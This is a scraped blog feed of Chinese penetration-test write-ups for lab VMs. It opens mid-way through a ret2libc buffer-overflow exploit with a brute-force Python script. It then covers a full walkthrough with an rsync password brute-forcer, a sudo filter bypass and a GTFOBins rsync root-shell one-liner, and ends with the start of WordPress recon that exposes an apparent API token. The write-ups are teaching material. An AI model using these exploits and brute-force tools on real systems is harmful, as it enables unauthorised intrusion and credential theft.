1.  生成一个唯一的非重复字符串作为输入。
2.  在 GDB 中运行程序，使用该字符串作为参数。
3.  当程序崩溃时，查看 EIP 寄存器的值。
4.  使用 `pattern_offset.rb` (或类似工具) 找到该值在原始字符串中的偏移。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ gdb dartVader
(gdb) set disassembly-flavor intel
(gdb) run $(/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 80) 
# 或者手动输入 pattern_create 生成的字符串，如 Aa0Aa1...
Starting program: /mnt/hgfs/gx/dartVader Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
[Thread debugging using libthread_db enabled]
Using host libthread_db library '/lib/x86_64-linux-gnu/libthread_db.so.1'.

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
(gdb) info registers eip
eip            0x63413563          0x63413563
```

EIP 被 `0x63413563` (ASCII 'c5Ac') 覆盖。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x63413563 -l 80
[*] Exact match at offset 76
```

偏移量为 76 字节。验证：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ gdb dartVader
(gdb) run $(python2 -c 'print 'A'*76 + 'BBBB'')
Starting program: /mnt/hgfs/gx/dartVader $(python2 -c 'print 'A'*76 + 'BBBB'')
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) info registers eip
eip            0x42424242          0x42424242
```

EIP 成功被 `BBBB` (0x42424242) 覆盖。

检查系统保护机制：

* ASLR (地址空间布局随机化):

  ```bash
  erso@deathStar1:~$ cat /proc/sys/kernel/randomize_va_space
  2
  ```

  ASLR 完全开启。

* NX (No-eXecute bit):

  ```bash
  erso@deathStar1:~$ readelf -W -l /bin/dartVader 
  # ...
  Program Headers:
    Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  # ...
    GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10 
  # ...
  ```

  `GNU_STACK` 标志为 `RW`，表示栈区可读可写但不可执行，NX bit 开启。

由于 ASLR 和 NX 开启，直接注入 shellcode 到栈上执行不可行。采用 Ret2Libc (返回到 libc) 技术。
由于是 32 位系统，libc 地址虽然随机化，但范围相对较小，可以尝试爆破 libc 基址。

获取 libc 中 `system`、`exit` 函数和 `'/bin/sh'` 字符串的偏移量：

```bash
erso@deathStar1:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep ' system@'
  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
# system_offset = 0x00040310

erso@deathStar1:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep ' exit@'
   139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
# exit_offset = 0x00033260

erso@deathStar1:~$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep '/bin/sh'
 162d4c /bin/sh
# sh_offset = 0x162d4c
```

多次运行 `ldd /bin/dartVader` 观察 libc 基址变化范围，例如：

```bash
erso@deathStar1:~$ ldd /bin/dartVader 
        linux-gate.so.1 =&gt;  (0xb7793000)
        libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb75d7000) # &lt;--- libc 基址
        /lib/ld-linux.so.2 (0xb7795000)
```

基址大约在 `0xb75xxxxx` 到 `0xb77xxxxx` 之间。

编写爆破脚本 `exp.py`：

```python
#!/usr/bin/env python3

from struct import pack
from subprocess import call

# 已知偏移量
system_offset = 0x40310
exit_offset = 0x33260
sh_offset = 0x162d4c

# 固定目标程序路径
app = b'/bin/dartVader'

# 缓冲区填充长度（根据你的溢出点调整）
offset = b'A' * 76

def try_exploit(libc_base):
    system = pack('&lt;I', libc_base + system_offset)
    exit_func = pack('&lt;I', libc_base + exit_offset)
    sh_str = pack('&lt;I', libc_base + sh_offset)
    payload = offset + system + exit_func + sh_str
    ret = call([app, payload])
    return ret == 0

# 爆破 libc 地址范围（每次增加 0x1000）
base_address = 0xb7500000
end_address = 0xb7700000

print('[*] Starting brute-force attack...')

found = False
for addr in range(base_address, end_address, 0x1000):
    print('[+] Trying libc base: 0x%08x' % addr)
    if try_exploit(addr):
        print('[+] Exploit successful!')
        found = True
        break

if not found:
    print('[-] Brute-force failed.')
```

在靶机上运行此脚本（或类似逻辑的脚本）。在爆破过程中，当 libc 基址正确时，`system('/bin/sh')` 会被调用，从而获得 root shell。
用户在 `0xb7564000` 这个基址附近（或就是这个基址）获得了成功。

```bash
erso@deathStar1:~$ python3 exp.py 
# ... (爆破过程) ...
[+] Trying libc base: 0xb7564000 
# (此处脚本可能因 system('/bin/sh') 调用而暂停，或者shell直接接管了终端)
# id
uid=1000(erso) gid=1000(erso) euid=0(root) groups=0(root),1000(erso)
# cat /root/message.txt
Art by Shanaka Dias
                    .==.
                   ()''()-.
        .---.       ;--; /
      .'_:___'. _..'.  __'.
      |__ --==|'-''' \'...;
      [  ]  :[|       |---\
      |__| I=[|     .'    '.
      / / ____|     :       '._
     |-/.____.'      | :       :
snd /___\ /___\      '-'._----'

-------------------------------------

Congratulations!!
You helped me destroy the empire's weapon.

-------------------------------------
If you had fun, love to get your feedback.
Send me a tweet @mrhenrike  ;)

Until the next VM and 'May the force be with you'.
```

### 总结

该靶机涉及了多种渗透技巧：

1.  通过流量捕获发现隐藏的 UDP 通信端口。
2.  解析 UDP 消息获取线索和密码。
3.  Base64 解码和图片隐写（steghide）获取进一步指令。
4.  端口敲门技术解锁新的服务端口。
5.  SSH 弱密码爆破（基于提示信息）。
6.  Linux SUID 二进制文件提权，通过缓冲区溢出（strcpy）和 Ret2Libc 技术绕过 ASLR 和 NX 保护，最终获得 root 权限。

整个过程对信息收集、线索关联和漏洞利用能力都有一定的考验。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/VulnHub%20Death%20Star-%201%20-shen-tou-ce-shi-bao-gao.html</guid><pubDate>Fri, 27 Jun 2025 09:29:01 +0000</pubDate></item><item><title>hmv_Sabulaji</title><link>https://7r1UMPHK.github.io/post/hmv_Sabulaji.html</link><description>害，这靶机，给我干沉默了

先探测ip

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ sudo arp-scan -l            
[sudo] password for kali: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:f8:ba:aa       VMware, Inc.
192.168.205.136 08:00:27:05:77:df       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:f3:0c:de       VMware, Inc.

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.966 seconds (130.21 hosts/sec). 4 responded
          
```

探测服务

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -p- 192.168.205.136
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 20:39 EDT
Nmap scan report for 192.168.205.136
Host is up (0.00012s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
873/tcp open  rsync
MAC Address: 08:00:27:05:77:DF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.20 seconds
                                                                            
```

https://book.hacktricks.wiki/zh/network-services-pentesting/873-pentesting-rsync.html#873---pentesting-rsync
感兴趣的自己去看，大概功能是

![image-20250612085331462](https://7r1umphk.github.io/image/20250612085338904.webp)

查看一下共享目录

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ rsync rsync://192.168.205.136:873

public          Public Files
epages          Secret Documents
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ rsync rsync://192.168.205.136:873/public/

drwxr-xr-x          4,096 2025/05/15 12:35:39 .
-rw-r--r--            433 2025/05/15 12:35:39 todo.list
                                                                       
```

拉下来

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ mkdir tmp
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ rsync -avz rsync://192.168.205.136:873/public/ ./tmp/public/

receiving incremental file list
created directory ./tmp/public
./
todo.list

sent 46 bytes  received 380 bytes  852.00 bytes/sec
total size is 433  speedup is 1.02
                                                            
┌──(kali㉿kali)-[/mnt/hgfs/gx/tmp/public]
└─$ cat todo.list | trans -b :zh 2&gt;/dev/null
待办事项列表
==========

1。Sabulaji：删除私人共享设置
 - 查看所有共享文件和文件夹。
 - 禁用任何私人共享链接或权限。

2。Sabulaji：更改为强密码
 - 创建一个新密码（至少12个字符，包括大写，小写，数字和符号）。
 - 更新系统设置中的密码。
 - 确保不从其他帐户重复使用新密码。
==========
      
```

提示我们sabulaji是弱密码，我爆破了ssh无果，那就继续看共享目录

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/tmp/public]
└─$ rsync -avz rsync://192.168.205.136:873/epages/ ./tmp/epages/

Password: 
@ERROR: auth failed on module epages
rsync error: error starting client-server protocol (code 5) at main.c(1850) [Receiver=3.4.1]
                      
```

要密码，找ai写个脚本爆破

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat bprsync.py 
#!/usr/bin/env python3
import subprocess
import os
import sys
from multiprocessing import Pool, Manager, cpu_count, RLock
import signal
from functools import partial
from tqdm import tqdm

TARGET_HOST = '192.168.205.136'
TARGET_PORT = '873'
TARGET_MODULE = 'epages'
WORDLIST_PATH = '/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-100000.txt'
USERNAMES = ['', 'sabulaji']
RSYNC_TIMEOUT = 10
try:
    NUM_PROCESSES = cpu_count() if cpu_count() &lt;= 8 else 8
except NotImplementedError:
    NUM_PROCESSES = 4

g_found_credential = None
g_pool = None


def signal_handler(sig, frame):
    global g_pool
    print('\n[!] CTRL+C pressed. Exiting.')
    if g_pool:
        g_pool.terminate()
        g_pool.join()
    sys.exit(1)


def check_password(password, found_flag, usernames):
    if found_flag.is_set():
        return None

    for username in usernames:
        if found_flag.is_set():
            return None

        user_part = f'{username}@' if username else ''
        target_url = f'rsync://{user_part}{TARGET_HOST}:{TARGET_PORT}/{TARGET_MODULE}'

        env = os.environ.copy()
        env['RSYNC_PASSWORD'] = password

        command = ['rsync', '--list-only', '-q', target_url]

        try:
            result = subprocess.run(
                command,
                env=env,
                capture_output=True,
                text=True,
                timeout=RSYNC_TIMEOUT
            )

            if result.returncode == 0:
                if not found_flag.is_set():
                    found_flag.set()
                    return (username, password)

        except (subprocess.TimeoutExpired, Exception):
            continue

    return None


def main():
    global g_found_credential, g_pool

    signal.signal(signal.SIGINT, signal_handler)
    tqdm.set_lock(RLock())

    if not os.path.exists(WORDLIST_PATH):
        print('[-] Wordlist not found.')
        sys.exit(1)

    try:
        with open(WORDLIST_PATH, 'r', encoding='latin-1', errors='ignore') as f:
            passwords = [line.strip() for line in f]
    except Exception as e:
        print(f'[-] Error reading wordlist: {e}')
        sys.exit(1)

    if not passwords:
        print('[-] Wordlist is empty.')
        sys.exit(1)

    total_passwords = len(passwords)
    print(f'[+] Starting rsync brute-force attack...')

    with Manager() as manager:
        found_flag = manager.Event()

        with Pool(processes=NUM_PROCESSES, initializer=tqdm.set_lock, initargs=(tqdm.get_lock(),)) as pool:
            g_pool = pool
            worker_func = partial(check_password, found_flag=found_flag, usernames=USERNAMES)

            try:
                with tqdm(total=total_passwords, unit=' passwords', dynamic_ncols=True) as pbar:
                    for result in pool.imap_unordered(worker_func, passwords):
                        pbar.update(1)
                        if result is not None:
                            g_found_credential = result
                            pool.terminate()
                            break
            finally:
                pool.join()

    print('\n' + '=' * 60)
    if g_found_credential:
        found_user, found_pass = g_found_credential
        display_user = found_user if found_user else '&lt;empty&gt;'
        print(f'[+] SUCCESS! Credentials found:')
        print(f'    Username: {display_user}')
        print(f'    Password: {found_pass}')
    else:
        print('[-] FAILED. No valid credentials found.')
    print('=' * 60)


if __name__ == '__main__':
    main()
   
```

小知识，[[Sublarge](https://hackmyvm.eu/profile/?user=Sublarge)](https://hackmyvm.eu/profile/?user=Sublarge)很喜欢使用xato-net-10-million-passwords-100000.txt这个字典，开爆

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ python3 $_               
[+] Starting rsync brute-force attack...
 16%|███████████████████▊                                                                                                           | 15589/100000 [06:55&lt;37:30, 37.51 passwords/s]

============================================================
[+] SUCCESS! Credentials found:
    Username: sabulaji
    Password: admin123
============================================================
                                                                    
```

拷下来

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ rsync -avz rsync://sabulaji@192.168.205.136:873/epages/ ./tmp/epages/

Password: 
receiving incremental file list
created directory ./tmp/epages
./
secrets.doc

sent 46 bytes  received 3,242 bytes  1,315.20 bytes/sec
total size is 13,312  speedup is 4.05
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cd tmp/epages 
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx/tmp/epages]
└─$ ls -al
total 13
drwxr-xr-x 1 kali kali     0 Jun 11 21:08 .
drwxr-xr-x 1 kali kali     0 Jun 11 21:08 ..
-rwxr-xr-x 1 kali kali 13312 May 15 12:17 secrets.doc
 
┌──(kali㉿kali)-[/mnt/hgfs/gx/tmp/epages]
└─$ libreoffice secrets.doc 
```

```
The Art of Keeping Secrets
In a world overflowing with information, keeping secrets is both an art and a challenge. Whether it's a personal diary tucked under a mattress or a cryptic message passed in a crowded café, the allure of hidden knowledge captivates us all.
Take, for example, the old server room in my office. It’s a dusty corner where forgotten machines hum quietly. One of them, a relic from the early 2000s, still runs an FTP service. The admin, in a moment of questionable judgment, named the default account 'welcome.' I overheard a colleague chuckle about it, saying the password was something absurdly simple, like 'P@ssw0rd123!'—hardly a secret worth keeping, but it’s been untouched for years.
Secrets, however, aren’t just about passwords or hidden files. They’re about intent. A whispered rumor about a project, a coded glance between friends, or even the way we guard our thoughts. The best secrets are those that hide in plain sight, unnoticed by the distracted eye.
So, how do we master this art? First, blend in. Don’t make your secret obvious. Second, protect it with something stronger than 'P@ssw0rd123!'—maybe a phrase only you’d understand. And finally, trust sparingly. Even the most welcoming systems can betray you if you’re not careful.
In the end, secrets remind us that not everything needs to be shared. Some things are better left unsaid, or at least, left to those who know where to look.

翻译
保守秘密的艺术
在这个信息泛滥的世界里，保守秘密既是一门艺术，也是一项挑战。无论是藏在床垫下的私人日记，还是在拥挤的咖啡馆里传递的神秘信息，隐藏知识的魅力都深深吸引着我们。
就拿我办公室里的老服务器机房来说吧。那是一个布满灰尘的角落，一些被遗忘的机器静静地嗡嗡作响。其中一台是21世纪初的遗物，至今仍在运行FTP服务。管理员一时糊涂，把默认账户命名为“welcome”。我无意中听到一位同事对此窃笑，说密码简单得可笑，比如“P@ssw0rd123！”——这算不上什么值得保守的秘密，但多年来却从未被触碰过。
然而，秘密不仅仅关乎密码或隐藏文件。它关乎意图。关于项目的悄悄流言，朋友之间暗中一瞥，甚至是我们守护思想的方式。最好的秘密是那些藏在众目睽睽之下，不被分心之眼察觉的秘密。
那么，我们如何掌握这门艺术呢？首先，融入其中。不要让你的秘密显而易见。其次，用比“P@ssw0rd123！”更强硬的语气来保护它——也许这句话只有你自己才能理解。最后，谨慎信任。即使是最友善的系统，如果你不小心，也可能背叛你。
最终，秘密提醒我们，并非所有事情都需要分享。有些事情最好不要说，或者至少留给那些知道去哪里找的人。
```

welcome:P@ssw0rd123!

登录ssh

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/tmp/epages]
└─$ ssh welcome@192.168.205.136
The authenticity of host '192.168.205.136 (192.168.205.136)' can't be established.
ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:5: [hashed name]
    ~/.ssh/known_hosts:9: [hashed name]
    ~/.ssh/known_hosts:10: [hashed name]
    ~/.ssh/known_hosts:11: [hashed name]
    ~/.ssh/known_hosts:12: [hashed name]
    ~/.ssh/known_hosts:13: [hashed name]
    ~/.ssh/known_hosts:14: [hashed name]
    ~/.ssh/known_hosts:15: [hashed name]
    (4 additional names omitted)
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.136' (ED25519) to the list of known hosts.
welcome@192.168.205.136's password: 
Permission denied, please try again.
welcome@192.168.205.136's password: 
Linux Sabulaji 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
welcome@Sabulaji:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome),123(mlocate)
```

扒拉

```
welcome@Sabulaji:~$ ls -la
total 24
drwxr-xr-x 2 welcome welcome 4096 May 16 01:21 .
drwxr-xr-x 4 root    root    4096 May 15 12:39 ..
lrwxrwxrwx 1 root    root       9 May 15 12:47 .bash_history -&gt; /dev/null
-rw-r--r-- 1 welcome welcome  220 Apr 11 22:27 .bash_logout
-rw-r--r-- 1 welcome welcome 3526 Apr 11 22:27 .bashrc
-rw-r--r-- 1 welcome welcome  807 Apr 11 22:27 .profile
-rw-r--r-- 1 root    root      44 May 15 12:49 user.txt
welcome@Sabulaji:~$ cat user.txt 
flag{user-cf7883184194add6adfa5f20b5061ac7}
welcome@Sabulaji:~$ sudo -l
Matching Defaults entries for welcome on Sabulaji:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on Sabulaji:
    (sabulaji) NOPASSWD: /opt/sync.sh
welcome@Sabulaji:~$ cat /opt/sync.sh
#!/bin/bash

if [ -z $1 ]; then
    echo 'error: note missing'
    exit
fi

note=$1

if [[ '$note' == *'sabulaji'* ]]; then
    echo 'error: forbidden'
    exit
fi

difference=$(diff /home/sabulaji/personal/notes.txt $note)

if [ -z '$difference' ]; then
    echo 'no update'
    exit
fi

echo 'Difference: $difference'

cp $note /home/sabulaji/personal/notes.txt

echo '[+] Updated.'
```

实现参数中不能包含'sabulaji'，然后使用diff 命令比较目标文件 /home/sabulaji/personal/notes.txt 和输入的 note 文件之间的差异,输入note为$1

先看看它一开始放了什么

```
welcome@Sabulaji:~$ sudo -u sabulaji /opt/sync.sh /dev/null
Difference: 1d0
&lt; Maybe you can find it...
[+] Updated.
```

![image-20250612091547195](https://7r1umphk.github.io/image/202506120915456.webp)

不，我找不到(手动狗头doge)

```
welcome@Sabulaji:~$ cd /tmp/
welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /etc/passwd
Difference: 0a1,27
&gt; root:x:0:0:root:/root:/bin/bash
&gt; daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
&gt; bin:x:2:2:bin:/bin:/usr/sbin/nologin
&gt; sys:x:3:3:sys:/dev:/usr/sbin/nologin
&gt; sync:x:4:65534:sync:/bin:/bin/sync
&gt; games:x:5:60:games:/usr/games:/usr/sbin/nologin
&gt; man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
&gt; lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
&gt; mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
&gt; news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
&gt; uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
&gt; proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
&gt; www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
&gt; backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
&gt; list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
&gt; irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
&gt; gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
&gt; nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
&gt; _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
&gt; systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
&gt; systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
&gt; systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
&gt; systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
&gt; messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
&gt; sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
&gt; welcome:x:1000:1000:,,,:/home/welcome:/bin/bash
&gt; sabulaji:x:1001:1001::/home/sabulaji:/bin/bash
[+] Updated.
welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /etc/shadow
diff: /etc/shadow: Permission denied
no update
```

扒拉了很久，然后我偶然间id了一下

```
welcome@Sabulaji:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome),123(mlocate)
```

它比正常的多了一个mlocate的组，然后我就去扒拉这个是干什么的
![image-20250612094149243](https://7r1umphk.github.io/image/202506120941472.webp)

啊这，那我知道了

```
welcome@Sabulaji:~$ strings /var/lib/mlocate/mlocate.db | less
```

然后搜索sabulaji

![image-20250612094040790](https://7r1umphk.github.io/image/202506120940995.webp)

看看是不是这个

```
welcome@Sabulaji:/home/sabulaji$ sudo -u sabulaji /opt/sync.sh /home/sabulaji/personal/creds.txt
error: forbidden
```

在这等我呢

```
welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /home/sabulaj*/personal/creds.txt
Difference: 1c1
&lt; 
---
&gt; Sensitive Credentials:Z2FzcGFyaW4=
[+] Updated.
```

拿下

```
welcome@Sabulaji:/tmp$ cd /home/
welcome@Sabulaji:/home$ su sabulaji
Password: 
sabulaji@Sabulaji:/home$ id
uid=1001(sabulaji) gid=1001(sabulaji) groups=1001(sabulaji)
```

扒拉

```
sabulaji@Sabulaji:/home$ cd sabulaji/
sabulaji@Sabulaji:~$ ls -al
total 24
drwxr-xr-x 3 sabulaji sabulaji 4096 May 16 01:22 .
drwxr-xr-x 4 root     root     4096 May 15 12:39 ..
lrwxrwxrwx 1 root     root        9 May 15 12:47 .bash_history -&gt; /dev/null
-rw-r--r-- 1 sabulaji sabulaji  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 sabulaji sabulaji 3526 Apr 18  2019 .bashrc
drwx------ 2 sabulaji sabulaji 4096 May 16 01:33 personal
-rw-r--r-- 1 sabulaji sabulaji  807 Apr 18  2019 .profile
sabulaji@Sabulaji:~$ cd personal/
sabulaji@Sabulaji:~/personal$ ls -al
total 16
drwx------ 2 sabulaji sabulaji 4096 May 16 01:33 .
drwxr-xr-x 3 sabulaji sabulaji 4096 May 16 01:22 ..
-r-------- 1 sabulaji sabulaji   35 May 16 01:32 creds.txt
-rw-r--r-- 1 sabulaji sabulaji   35 Jun 11 21:56 notes.txt
sabulaji@Sabulaji:~/personal$ sudo -l
Matching Defaults entries for sabulaji on Sabulaji:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sabulaji may run the following commands on Sabulaji:
    (ALL) NOPASSWD: /usr/bin/rsync
```

有现成的

https://gtfobins.github.io/gtfobins/rsync/#sudo

```
sabulaji@Sabulaji:~/personal$ sudo rsync -e 'sh -c 'sh 0&lt;&amp;2 1&gt;&amp;2'' 127.0.0.1:/dev/null
# id
uid=0(root) gid=0(root) groups=0(root)
# bash           
root@Sabulaji:/home/sabulaji/personal# cat /root/root.txt 
flag{root-89e62d8807f7986edb259eb2237d011c}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Sabulaji.html</guid><pubDate>Fri, 27 Jun 2025 09:28:59 +0000</pubDate></item><item><title>hmv_Disguise靶机渗透测试详解</title><link>https://7r1UMPHK.github.io/post/hmv_Disguise-ba-ji-shen-tou-ce-shi-xiang-jie.html</link><description># 一、信息收集与初步探测

## 1.1 主机发现

渗透测试的第一步通常是发现网络中的存活主机。这里我们使用`arp-scan`工具对本地网络进行扫描。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ sudo arp-scan -l
[sudo] password for kali:
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.
192.168.205.211 08:00:27:ea:d3:f5       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:f8:d7:c5       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.028 seconds (126.23 hosts/sec). 4 responded
```

扫描结果显示，IP地址为 `192.168.205.211` 的主机响应了ARP请求，其MAC地址为 `08:00:27:ea:d3:f5`。该IP将作为我们后续渗透的目标。

## 1.2 端口扫描

确定目标主机后，使用`nmap`进行端口扫描，以识别目标主机开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -p- --min-rate 10000 192.168.205.211
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 21:57 EDT
Nmap scan report for 192.168.205.211
Host is up (0.00027s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:EA:D3:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.20 seconds
```

Nmap扫描结果表明，目标主机开放了 TCP 22端口 (SSH服务) 和 TCP 80端口 (HTTP服务)。

# 二、Web应用渗透测试

## 2.1 域名解析与站点识别

直接通过IP地址访问目标主机的HTTP服务 (端口80)，发现网页内容提示需要解析域名。
![image-20250516095849516](https://7r1umphk.github.io/image/20250516095856656.webp)

根据页面提示，该站点期望通过域名 `http://disguise.hmv` 访问。我们将此域名与目标IP的映射关系添加到本地 `/etc/hosts` 文件中。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ echo '192.168.205.211 http://disguise.hmv' | sudo tee -a /etc/hosts &gt; /dev/null

┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ tail -n 1 /etc/hosts
192.168.205.211 http://disguise.hmv
```

配置完成后，通过域名 `http://disguise.hmv` 访问站点。观察页面页脚信息，初步判断该站点是基于WordPress构建的。
![image-20250516100842676](https://7r1umphk.github.io/image/20250516100842781.webp)

## 2.2 WordPress漏洞扫描与信息收集

### 2.2.1 Nuclei扫描

首先尝试使用`nuclei`对目标WordPress站点进行自动化漏洞扫描。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nuclei -u http://disguise.hmv/

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.4.2

                projectdiscovery.io

[INF] Current nuclei version: v3.4.2 (outdated)
[INF] Current nuclei-templates version: v10.2.1 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 42
[INF] Templates loaded for current scan: 7925
[WRN] Loading 198 unsigned templates for scan. Use with caution.
[INF] Executing 7727 signed templates from projectdiscovery/nuclei-templates
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1736 (Reduced 1632 Requests)
[INF] Using Interactsh Server: oast.pro
[INF] No results found. Better luck next time!
```

Nuclei扫描未发现明显漏洞。接下来使用更专业的WordPress扫描工具`wpscan`。

### 2.2.2 WPScan扫描

执行`wpscan`对站点进行详细枚举，包括用户、主题、插件等。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ wpscan --url 'http://disguise.hmv' --enumerate u,t,p,m --random-user-agent --api-token 6jJQ6zlZssGILOaGfCu2z7aVSLdYgEYokmESJuHejs8
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28

       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://disguise.hmv/ [192.168.205.211]
[+] Started: Thu May 15 22:20:25 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.59 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://disguise.hmv/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://disguise.hmv/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
